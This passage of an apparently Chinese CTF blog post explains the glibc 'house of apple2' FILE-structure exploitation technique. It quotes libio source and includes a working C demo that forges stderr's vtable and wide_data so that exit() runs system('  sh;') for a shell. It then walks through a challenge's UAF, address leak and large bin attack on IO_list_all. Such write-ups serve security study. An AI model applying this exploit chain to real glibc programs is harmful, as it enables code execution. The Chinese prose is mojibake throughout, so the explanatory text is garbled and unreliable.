class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure><p>è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰é€šå¸¸éƒ½æ˜¯åŠ«æŒ <code>exit</code> å‡½æ•°ä¸­çš„è¿™ä¸ª <code>_IO_OVERFLOW</code> ä¹ˆï¼Œ<code>house of apple2</code> æœ‰å¤šä¸ª <code>IO</code> åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæˆ‘åªæ€»ç»“ä»è¿™ä¸ª <code>_IO_OVERFLOW</code> è§¦å‘çš„åˆ©ç”¨é“¾ã€‚</p><h5 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><p>å‡è®¾æˆ‘ä»¬ç°åœ¨å°†åŸæœ¬ <code>vtable</code> ä¸­çš„ <code>_IO_jump_t</code> ç»“æ„ä½“åœ°å€æ”¹æˆ <code>_IO_wfile_jumps</code> ,é‚£ä¹ˆæœ¬åº”å»è°ƒç”¨ <code>__overflow</code> å‡½æ•°ä¸ä¼šè¢«æ‰§è¡Œï¼Œè€Œæ˜¯å»è°ƒç”¨ <code>_IO_wfile_jumps</code> ä¸­çš„ <code>_IO_wfile_overflow</code> å‡½æ•°ã€‚</p><p>è¿™é‡Œåˆ†æä¸‹ <code>_IO_wfile_overflow</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wdoallocbuf (f);</span><br><span class="line">  _IO_free_wbackup_area (f);</span><br><span class="line">  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_overflow)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦è°ƒç”¨åˆ° <code>_IO_wdoallocbuf</code> å‡½æ•°ï¼Œè‡³äºéœ€è¦ç»•è¿‡çš„æ£€æŸ¥åé¢å†æ€»ç»“ã€‚</p><p><code>_IO_wdoallocbuf</code> å‡½æ•°æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p><code>_IO_WDOALLOCATE (fp)</code> è¿™é‡Œå°±æ˜¯æˆ‘ä»¬æœ€ååŠ«æŒç¨‹åºæ‰§è¡Œæµçš„åœ°æ–¹ï¼Œå®ƒæ˜¯è¿™æ ·è¢«è°ƒç”¨çš„ <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> ã€‚è¿™ä¸ªå‡½æ•°æœ€ç»ˆä¹Ÿæ˜¯é€šè¿‡ <code>vtable</code> è¢«è°ƒç”¨çš„ï¼Œä½†è¿™ä¸ªæ˜¯ <code>_wide_data</code> ç»“æ„ä½“ä¸­çš„ <code>_wide_vtable</code> æ‰€è°ƒç”¨çš„ï¼Œç”±äºæ²¡æœ‰åˆæ³•æ€§æ£€æµ‹ï¼Œå°±å¯ä»¥ä¼ªé€ è¿™ä¸ª <code>vtable</code>ã€‚</p><p>å†æ¥å›é¡¾ä¸‹ä¸Šé¢æåˆ°çš„ <code>_wide_vtable</code> ç»“æ„ä½“ ,å¯ä»¥çœ‹åˆ°è¿™ä¸ª <code>doallocate</code> ä½äºåç§» <code>0x68</code> çš„ä½ç½®ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦è®©ä¼ªé€ çš„è¿™ä¸ª <code>vtable</code> åŠ  <code>0x68</code> çš„ä½ç½®ä¸º <code>system</code> å‡½æ•°å³å¯ã€‚æ¥ä¸‹æ¥æƒ³è·å– <code>shell</code> ï¼Œåªéœ€è¦æ§åˆ¶å‚æ•°å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ€ç»ˆæ‰§è¡Œçš„æ˜¯ <code>_IO_WDOALLOCATE (fp)</code> ,è€Œè¿™ä¸ª <code>fp</code> å°±æ˜¯ <code>IO_FILE</code>ï¼Œå› æ­¤æ§åˆ¶å‚æ•°çš„è¯åªéœ€è¦è®© <code>flags</code> å­—æ®µä¸º <code>/bin/sh</code> ã€‚</p><p>æ€»ç»“ä¸‹æ‰§è¡Œåˆ°æœ€åçš„ä½ç½®éœ€è¦ç»•è¿‡çš„æ£€æŸ¥</p><ol><li><code>_flags</code> è®¾ç½®ä¸º<code>~(2 | 0x8 | 0x800)</code> ï¼Œå¦‚æœæ˜¯éœ€è¦è·å– <code>shell</code> çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥å°†å‚æ•°å†™ä¸º <code>  sh;</code> è¿™æ · <code>_flags</code> æ—¢èƒ½ç»•è¿‡æ£€æŸ¥ï¼Œåˆèƒ½è¢« <code>system</code> å‡½æ•°å½“åšå‚æ•°æˆåŠŸæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ <code>sh;</code> å‰é¢æ˜¯æœ‰ä¸¤ä¸ªç©ºæ ¼çš„ï¼ˆè¿™ä¸ªå€¼æ˜¯ <code>0x3b68732020</code> ï¼‰</li><li><code>_wide_data-&gt;_IO_write_base</code> è®¾ç½®ä¸º <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> è®¾ç½®ä¸º <code>0</code> </li><li><code>fp-&gt;_mode == 0</code> å’Œ <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>  ,è¿™æ ·å³å¯è§¦å‘ <code>_IO_OVERFLOW</code>ã€‚</li></ol><p>ä¸Šé¢æåˆ°çš„æ˜¯ç»•è¿‡çš„æ£€æŸ¥æ‰€éœ€è¦ä¼ªé€ çš„å­—æ®µï¼Œç„¶åè¿˜æœ‰å‡ ä¸ªåœ°æ–¹çš„è®¾ç½®å¦‚ä¸‹</p><ol><li>å°† <code>IO_FILE</code> ä¸­çš„ <code>vtable</code> å­—æ®µæ”¹ä¸º <code>_IO_wfile_jumps</code></li><li>å°† <code>IO_FILE</code> ä¸­çš„ <code>wide_data</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ï¼Œç›®çš„æ˜¯æ§åˆ¶ <code>wide_data</code> ä¸­çš„ <code>write_base</code> å’Œ <code>buf_base</code> ä¸º0</li><li>æ§åˆ¶ <code>wide_data-&gt;wide_vtable</code> ä¸ºåœ°å€ <code>A</code>ï¼Œåœ°å€ <code>A</code> æ»¡è¶³ <code>*(A+0x68) == system</code> ï¼ˆæ­¤å¤„çš„ <code>system</code> åœ°å€æ˜¯è‡ªå·±å¸ƒç½®çš„ï¼‰</li></ol><p>è‡ªå·±å†™äº†ä¸€ä¸ª <code>demo</code>  å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc_base --------&gt; %llx\n&quot;</span>,libc_base);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> stderr_address=libc_base+<span class="number">0x21a6a0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stderr address --------&gt; %llx\n&quot;</span>,stderr_address);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data=stderr_address+<span class="number">0xa0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data --------&gt; %llx\n&quot;</span>,wide_data);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> vtable=stderr_address+<span class="number">0xd8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vtable --------&gt; %llx\n&quot;</span>,vtable);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_wfile_jumps=libc_base+<span class="number">0x2160c0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_write_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(wide_data)+<span class="number">0x18</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_buf_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data+<span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;io_wfile_jumps --------&gt; %llx\n&quot;</span>,io_wfile_jumps);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data_write_base --------&gt; %llx\n&quot;</span>,wide_data_write_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_data_buf_base --------&gt; %llx\n&quot;</span>,wide_data_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_vtable=libc_base+<span class="number">0x219980</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wide_vtable --------&gt; %llx\n&quot;</span>,wide_vtable);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system=libc_base+<span class="number">0x50d60</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> write_base=stderr_address+<span class="number">0x20</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> buf_base=stderr_address+<span class="number">0x38</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_ptr=wide_vtable<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)vtable=io_wfile_jumps;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_buf_base=<span class="number">0</span>;</span><br><span class="line">*((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)system_ptr)=system;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_vtable=libc_base+<span class="number">0x219910</span>;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)stderr_address=<span class="number">0x3b68732020</span>; <span class="comment">//~(2 | 0x8 | 0x800);</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301301711064.png" alt="image-20230130171112854"></p><h4 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h4><p>é¢˜ç›®æ˜¯ <strong>roderick</strong> å¸ˆå‚…åœ¨ <code>house of apple</code> æ–‡ç« ä¸­çš„ä¾‹é¢˜ï¼Œä¸‹è½½é“¾æ¥åœ¨è¿™é‡Œï¼š<a href="https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r">https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r</a>  æå–ç ï¼š632r<br><strong>roderick</strong> å¸ˆå‚…è¯´è¿™ä¸ªé¢˜æ˜¯ <code>2.34</code> çš„ <code>libc</code> ï¼Œæˆ‘æ˜¯ç›´æ¥æ‹–åˆ°äº† <code>22.04</code> çš„ <code>ubuntu</code> é‡Œï¼Œç”¨ <code>2.35</code> çš„ <code>libc</code> æ‰“çš„ã€‚</p><h5 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930803.png" alt="image-20230202093006528" style="zoom: 67%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930552.png" alt="image-20230202093028442" style="zoom:50%;" /><h5 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>ç¨‹åºæœ€å¼€å§‹å…ˆè¯¢é—®äº†ä¸€ä¸ª <code>key</code>ï¼Œè¿™ä¸ª <code>key</code> å†³å®šäº†æˆ‘ä»¬ç”³è¯·å †å—çš„å¤§å°ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020932796.png" alt="image-20230202093211719"></p><p>ä¸Šé¢çš„ä»£ç è¯´æ˜ <code>key</code> å®é™…çš„èŒƒå›´æ˜¯ <code>0x660 ~ 0xaa0</code></p><p>ç„¶åæœ‰å››ä¸ªåŠŸèƒ½åˆ†åˆ«æ˜¯ <code>add</code> <code>delete</code> <code>read</code> <code>write</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020934204.png" alt="image-20230202093401108" style="zoom:50%;" /><p><code>add</code> å‡½æ•°ä¸­åªèƒ½é€‰æ‹©ä¸‰ç§å¤§å°çš„å †å—ç”³è¯·ï¼Œåˆ†åˆ«æ˜¯ <code>key</code> <code>key+0x10</code> <code>2*key</code> ï¼Œå¹¶ä¸”åªèƒ½ <code>add</code> å‡½æ•°åªè´Ÿè´£ç”³è¯·å †å—ï¼Œæ— æ³•å‘ç”³è¯·çš„å †å—å†™å…¥æ•°æ®ï¼Œæœ€å¤šèƒ½åˆ›å»º <code>0x10</code> ä¸ªå †å—ã€‚</p><p><code>delete</code> å‡½æ•°å­˜åœ¨ä¸€ä¸ª <code>UAF</code> æ¼æ´ï¼Œå¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020938907.png" alt="image-20230202093807826" style="zoom:50%;" /><p><code>read</code> å’Œ <code>write</code> å‡½æ•°å°±æ˜¯ä¸€ä¸ªç”¨äºå‘å †å—æ­£å¸¸å†™å…¥æ•°æ®ï¼ˆæ²¡æœ‰æº¢å‡ºï¼‰ï¼Œä¸€ä¸ªå¯ä»¥æ‰“å°å †å—ä¸­ <code>0x10</code> çš„æ•°æ®ï¼ˆä½¿ç”¨çš„ <code>write</code> å‡½æ•°ä¸ä¼šè¢« <code>\x00</code> æˆªæ–­ï¼‰ï¼Œç„¶åå„è‡ªåªèƒ½æ‰§è¡Œä¸€æ¬¡</p><h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>è¿™é‡Œåªè®°å½•ä½¿ç”¨ <code>house of apple2</code> çš„æ”»å‡»æ‰‹æ³•ï¼Œåœ¨ <code>house of apple1</code> ä¸­ <strong>roderick</strong> å¸ˆå‚…å±•ç¤ºäº†å¦ä¸€ç§çš„æ”»å‡»æ–¹å¼ï¼ˆä¸è¿‡ä¸ªäººæ„Ÿè§‰æ²¡æœ‰ <code>apple2</code> çš„åˆ©ç”¨ç®€å•ï¼‰ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ•´ä½“çš„åˆ©ç”¨æ€è·¯ï¼Œè‡³äºå…·ä½“å¸ƒå±€ç»“æ„ä½“çš„ç»†èŠ‚è¿˜éœ€è¦åšé¢˜æ—¶è‡ªå·±ç”¨ <code>gdb</code> ä¸€ç‚¹ä¸€ç‚¹è°ƒè¯•å‡ºæ¥ã€‚</p><h6 id="æ³„éœ²-libc-å’Œ-heap-åœ°å€"><a href="#æ³„éœ²-libc-å’Œ-heap-åœ°å€" class="headerlink" title="æ³„éœ² libc å’Œ heap åœ°å€"></a>æ³„éœ² <code>libc</code> å’Œ <code>heap</code> åœ°å€</h6><p>å› ä¸ºåªæœ‰ä¸€æ¬¡ <code>write</code> å‡½æ•°æ‰§è¡Œçš„æœºä¼šï¼Œè®©å †å—è¿›å…¥ <code>large bin</code> ä¸­æ³„éœ²ä¸¤ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºç”¨çš„æ˜¯ <code>write</code> æ‰“å°å‡ºæ¥çš„å‰ <code>0x10</code> ä¸ªå­—èŠ‚éƒ½æ˜¯ <code>libc</code> åœ°å€ã€‚å¦‚æœè®© <code>unsorted bin</code> ä¸­æœ‰ä¸¤ä¸ªå †å—ï¼ˆä¸èƒ½åˆå¹¶ï¼‰ï¼Œå»æ‰“å° <code>unnsorted bin</code> ä¸­çš„å †å—å°±èƒ½ç”¨ <code>0x10</code> çš„æ•°æ®æ³„éœ²å‡º <code>libc</code> åœ°å€å’Œå †åœ°å€äº†ã€‚</p><h6 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h6><p>ç”¨ä¸Šæ–‡æåˆ°çš„è¡¥å……ä¸­çš„æ–¹æ³•ï¼Œå…ˆç”³è¯·ä¸€ä¸ªå¤§çš„å †å—ï¼Œç„¶åè¿›å…¥ <code>large bin</code> ä¸­ï¼Œç„¶åç¯¡æ”¹å…¶ <code>bk_nextsize</code> ä¸º <code>target_addr-0x20</code> ï¼ˆæ­¤æ—¶ç”¨äº†å”¯ä¸€ä¸€æ¬¡å†™çš„æœºä¼šï¼‰ï¼Œè¿˜éœ€è¦å»å†™å…¶ä»–æ•°æ®ï¼Œè¿™é‡Œåé¢å†è¯´ï¼Œç¯¡æ”¹å®Œ <code>bk_nextsize</code> åï¼Œå†è®©ä¸€ä¸ªç•¥å°çš„å †å—è¿›å…¥ <code>large bin</code> å³å¯è§¦å‘ <code>large bin attack</code> ï¼Œæ­¤æ—¶ <code>IO_list_all</code> å°±ä¸ºç•¥å°çš„å †å—åœ°å€ï¼Œä½†é—®é¢˜æ˜¯æˆ‘ä»¬åªèƒ½æ§åˆ¶å¤§å †å—ä¸­çš„æ•°æ®ï¼Œå‚è€ƒäº† <strong>winmt</strong> å¸ˆå‚…çš„åšæ³•ï¼Œå†ç”³è¯·ä¸å°å †å—ç­‰å¤§çš„å †å—å°±ä¼šä» <code>large bin</code> ä¸­å–å‡ºæ¥å°å †å—ï¼Œè¿™æ ·å°±ä¼šè§¦å‘ <code>unlink</code> ï¼Œä»£ç å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022258433.png" alt="image-20230202225821151" style="zoom:50%;" /><p>æ­¤æ—¶è¿™å‡ ä¸ªæŒ‡é’ˆä¸º</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022259382.png" alt="image-20230202225959295"></p><p>è¿™ä¸ª <code>p-&gt;bk_nextsize</code> æ˜¯  <code>IO_list_all-0x20</code> çš„åœ°å€ï¼Œè€Œè§¦å‘ <code>p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize</code> å°±å°†å¤§å †å—çš„åœ°å€å†™å…¥äº† <code>IO_list_all-0x20+0x20</code> çš„ä½ç½®ï¼Œæ‰€ä»¥åªè¦å†ç”³è¯·ä¸€ä¸ªå’Œå°å †å—ç­‰å¤§çš„å †å—ï¼Œè§¦å‘è¿™ä¸ª <code>unlink</code> å°±å¯ä»¥å°†å¤§å †å—çš„åœ°å€å†™å…¥ <code>IO_list_all</code> ä¸­äº†ï¼ˆ<strong>roderick</strong> å¸ˆå‚…å’Œ<strong>winmt</strong> å¸ˆå‚…éƒ½å¤ªå¼ºäº†ï¼‰</p><h6 id="ä¼ªé€ ç»“æ„ä½“-amp-amp-å¸ƒå±€"><a href="#ä¼ªé€ ç»“æ„ä½“-amp-amp-å¸ƒå±€" class="headerlink" title="ä¼ªé€ ç»“æ„ä½“&amp;&amp;å¸ƒå±€"></a>ä¼ªé€ ç»“æ„ä½“&amp;&amp;å¸ƒå±€</h6><p>æ§åˆ¶äº†é“¾è¡¨å¤´æŒ‡é’ˆï¼Œå°±æ„å‘³ç€æ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹ä¼ªé€  <code>IO_FILE</code> äº†ï¼Œå› ä¸ºè¿™ä¸ª <code>IO_FILE</code> çš„å‰å‡ ä¸ªå­—æ®µéƒ½æ— æ³•æ”¹å˜ï¼ˆå› ä¸ºæ˜¯å †å—çš„ <code>prev_size</code> <code>size</code> <code>fd</code> <code>bk</code> <code>fd_nextsize</code> <code>bk_nextsize</code> å­—æ®µï¼‰ï¼Œè¿™ä¼šå¹²æ‰°æˆ‘ä»¬ä¼ªé€  <code>IO_FILE</code> çš„å­—æ®µï¼ˆæ¯”å¦‚ <code>_flags</code> å­—æ®µè¿™é‡Œæˆ‘ä»¬ä¸å¯æ§ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬è¿™ä¸ªç»“æ„ä½“åªæ§åˆ¶ <code>IO_write_base</code> å’Œ <code>_chain</code> å­—æ®µï¼Œæˆ‘ä¸“é—¨æŠŠ <code>IO_write_base</code> æ”¹æˆ <code>IO_list_all</code> æ˜¯å› ä¸ºè¿™ä¸ªå­—æ®µéœ€è¦å¤§äº <code>IO_write_ptr</code> å­—æ®µï¼Œæ‰ä¸ä¼šè§¦å‘ <code>overflow</code> ï¼Œç„¶åé€šè¿‡ <code>_chain</code> éå†åˆ°ä¸‹ä¸ªç»“æ„ä½“çš„æ—¶å€™å»å¼€å§‹çœŸæ­£åˆ©ç”¨ã€‚ï¼ˆæ­¤æ—¶ä¼ªé€ çš„ç¬¬ä¸€ä¸ªç»“æ„ä½“å¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022310901.png" alt="image-20230202231015667" style="zoom:50%;" /><p>æ¥ä¸‹æ¥å°±è¦å¼€å§‹ä¼ªé€ è§¦å‘ <code>overflow</code> çš„è¿™ä¸ª <code>IO_FILE</code> ç»“æ„ä½“äº†ï¼Œæ¡ä»¶æŒ‰ç…§ä¸Šé¢ <code>house of apple2</code> ä¸­æ€»ç»“çš„ä¼ªé€ å³å¯ï¼Œè¿™é‡Œä¼ªé€ å­—æ®µæ²¡å•¥å¯è¯´çš„ï¼Œåªèƒ½å¯¹ç€ <code>gdb</code> ä¸€ç‚¹ä¸€ç‚¹æŠŠåç§»è°ƒå‡ºæ¥ï¼Œç„¶åå¸ƒå±€å¥½ï¼Œå› ä¸ºè¿˜è¦å†å¸ƒç½®ä¸€ä¸ª <code>wide_data</code> ç»“æ„ä½“ï¼Œæ‰€ä»¥è°ƒè¯•èµ·æ¥è¦èŠ±è´¹ç‚¹æ—¶é—´ã€‚æ…¢æ…¢çš„æŒ‰ç…§æ¯ä¸ªæ¡ä»¶çš„è¦æ±‚æ§åˆ¶æ¯ä¸ªå­—æ®µå³å¯ï¼Œä¸‹é¢ç›´æ¥ç»™å‡ºæœ€åä¼ªé€ å‡ºæ¥çš„ç»“æ„ä½“ã€‚</p><p>è¿™æ˜¯è§¦å‘ <code>overflow</code> 